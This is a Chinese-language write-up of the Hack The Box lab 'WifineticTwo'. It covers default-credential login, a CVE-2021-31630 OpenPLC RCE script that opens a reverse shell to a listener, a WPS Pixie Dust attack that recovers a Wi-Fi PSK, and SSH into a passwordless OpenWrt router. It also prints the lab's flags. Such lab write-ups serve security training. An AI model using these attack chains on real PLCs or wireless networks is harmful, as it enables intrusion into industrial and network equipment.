# 服务

```
ap -sV -Pn -A 10.10.11.7
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-22 02:27 EDT
Nmap scan report for 10.10.11.7
Host is up (0.47s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.11.7:8080/login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zp373w.DbudRfVZk5uQ-u063JM7C28sM4g; Expires=Mon, 22-Jul-2024 06:32:43 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Mon, 22 Jul 2024 06:27:43 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.Zp373A.TNK-ypoi9sMhVF25Y1eLXkiDPN8; Expires=Mon, 22-Jul-2024 06:32:40 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Mon, 22 Jul 2024 06:27:40 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zp373Q.HJKFRCSwdOdAXA_nMFRuVEBfmKE; Expires=Mon, 22-Jul-2024 06:32:41 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Mon, 22 Jul 2024 06:27:41 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18

```

8080可以用```openplc :openplc ```登录


使用[cve-2021-31630](https://github.com/thewhiteh4t/cve-2021-31630)

```
┌──(root㉿kali)-[~/htb/WifineticTwo/cve-2021-31630]
└─# python cve_2021_31630.py -lh 10.10.16.15 -lp 443 http://10.10.11.7:8080

------------------------------------------------
--- CVE-2021-31630 -----------------------------
--- OpenPLC WebServer v3 - Authenticated RCE ---
------------------------------------------------

[>] Found By : Fellipe Oliveira
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t ]

[>] Target   : http://10.10.11.7:8080
[>] Username : openplc
[>] Password : openplc
[>] Timeout  : 20 secs
[>] LHOST    : 10.10.16.15
[>] LPORT    : 443

[!] Checking status...
[+] Service is Online!
[!] Logging in...
[+] Logged in!
[!] Restoring default program...
[+] PLC Stopped!
[+] Cleanup successful!
[!] Uploading payload...
[+] Payload uploaded!
[+] Waiting for 5 seconds...
[+] Compilation successful!
[!] Starting PLC...
[+] PLC Started! Check listener...
[!] Cleaning up...
[+] PLC Stopped!
[+] Cleanup successful!

```

拿到shell
```
┌──(root㉿kali)-[~/htb]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.7] 57526
bash: cannot set terminal process group (173): Inappropriate ioctl for device
bash: no job control in this shell
root@attica04:/opt/PLC/OpenPLC_v3/webserver# 

root@attica04:/opt/PLC/OpenPLC_v3/webserver# whoami
whoami
root
root@attica04:/opt/PLC/OpenPLC_v3/webserver# cd /root
cd /root
root@attica04:~# ls
ls
user.txt
root@attica04:~# cat user.txt
cat user.txt
9f6f1746682fcbc2d9fb05f93c5e6592
root@attica04:~# 

```

已经是root权限，但显然没那么简单


# 提权
这里要用到OSWP学到的一些知识

查看网络
```
root@attica04:~# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.3.5  netmask 255.255.255.0  broadcast 10.0.3.255
        inet6 fe80::216:3eff:fe43:463a  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:43:46:3a  txqueuelen 1000  (Ethernet)
        RX packets 44442  bytes 5278397 (5.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 28287  bytes 5416810 (5.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2048  bytes 137499 (137.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2048  bytes 137499 (137.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:05:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

根据[hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi)里的指示

扫描网络
```
root@attica04:~# iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA"
< | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA"
BSS 02:00:00:00:01:00(on wlan0)
        SSID: plcrouter
                 * Authentication suites: PSK
                 * SSID List
        WPS:     * Version: 1.0
root@attica04:~# iwlist wlan0 scan
iwlist wlan0 scan
wlan0     Scan completed :
          Cell 01 - Address: 02:00:00:00:01:00
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"plcrouter"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00061dd165f28271
                    Extra: Last beacon: 16ms ago
                    IE: Unknown: 0009706C63726F75746572
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400000200000040
                    IE: Unknown: DD5C0050F204104A0001101044000102103B00010310470010572CF82FC95756539B16B5CFB298ABF11021000120102300012010240001201042000120105400080000000000000000101100012010080002210C1049000600372A000120

```
加密方式是PSK，地址是：02:00:00:00:01:00，网卡是：wlan0

使用[OneShot-C](https://github.com/nikita-yfh/OneShot-C)
```
root@attica04:/tmp# chmod +x oneshot
chmod +x oneshot
root@attica04:/tmp# ./oneshot -i wlan0 -b 02:00:00:00:01:00 -K
./oneshot -i wlan0 -b 02:00:00:00:01:00 -K
[*] Running wpa_supplicant...
[*] Trying pin 12345670...
[*] Scanning...
[*] Authenticating...
[+] Authenticated
[*] Associating with AP...
[+] Associated with 02:00:00:00:01:00 (ESSID: plcrouter)
[*] Received Identity Request
[*] Sending Identity Response...
[*] Received WPS Message M1
[P] E-Nonce: 31acfcced424c1c412dc43ecb37aa625
[*] Building Message M2
[P] PKR: d0cfa36d2dd589bcc06343f358a45b21a08f0c1f13ba3e8b4370a6d28c5c23b916505ba1c60523ec1fe59dbacb8bef1bdb11e6d18e4fb40b64e9b4994e3dc3732ac51123798d707cdbfc6adf3fd9fa5806808db6f068d96d0e53887744e4471d0f3fc7bc00ab208f40883ebcbfb30c77ff783386b2e6e8ec7db9cb192609080a81d01f356190a8e4cd55b7930b12c8c9318812376555c9c75ff9614dc4a5fe39cbb78935e4dd196ce4875091d5fcfbcb52e938915ee927eebbd65063f1e20e4d
[P] PKE: e8d65855c4d6c6068a164b45e46a97dc5ba6b2c8d6859ba7c6c430fe2fb273dd4c29c32eae73061d22bc6134d6c8d77cc8cc22f6762b52f8e6a60672e691987381704cd06dda1fbcbfaa0d06b172048334a06779fe615f0c95628df4c06c7a31071773de1ae09b3cd5ecbb68a18bf1265cedce56db6df869f3e02634647e606cb40312dabc1110d4c48183480bddfcd9762bb3b266b674c2390a7d87b1d5fdc6a6668254d49937498b535d5233a79b89d33f435a063f51b5c02ec4c67bf578df
[P] Authkey: 12a9390ca13b828d41c297342cae2401ddd486474757ae37d70dde0050b2594c
[*] Received WPS Message M3
[P] E-Hash1: 98684150308cd78bfbe4b7a63d1906583b7ddf9a3caf6b2893cab5779e88ae5c
[P] E-Hash2: cc438812875f27b1303ccedb513d65d4d389cf0879c85c8043788e68103837b1
[*] Building Message M4
[*] Received WPS Message M5
[*] Building Message M6
[*] Received WPS Message M7
[+] WPS PIN: 12345670
[+] WPA PSK: NoWWEDoKnowWhaTisReal123!
[+] AP SSID: plcrouter

```

得到一个密码：```NoWWEDoKnowWhaTisReal123!```，



依次执行

```
wpa_passphrase plcrouter 'NoWWEDoKnowWhaTisReal123!' > config

wpa_supplicant -B -c config -i wlan0

ifconfig wlan0 192.168.1.7 netmask 255.255.255.0


ssh root@192.168.1.1
```

拿到网关机器
```
root@attica01:/tmp# ssh root@192.168.1.1
ssh root@192.168.1.1
The authenticity of host '192.168.1.1 (192.168.1.1)' can't be established.
ED25519 key fingerprint is SHA256:ZcoOrJ2dytSfHYNwN2vcg6OsZjATPopYMLPVYhczadM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Warning: Permanently added '192.168.1.1' (ED25519) to the list of known hosts.


BusyBox v1.36.1 (2023-11-14 13:38:11 UTC) built-in shell (ash)

  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.2, r23630-842932a63d
 -----------------------------------------------------
=== WARNING! =====================================
There is no root password defined on this device!
Use the "passwd" command to set up a new password
in order to prevent unauthorized SSH logins.
--------------------------------------------------
root@ap:~# cat root.txt
cat root.txt
a1a5e93acbe55c254...
```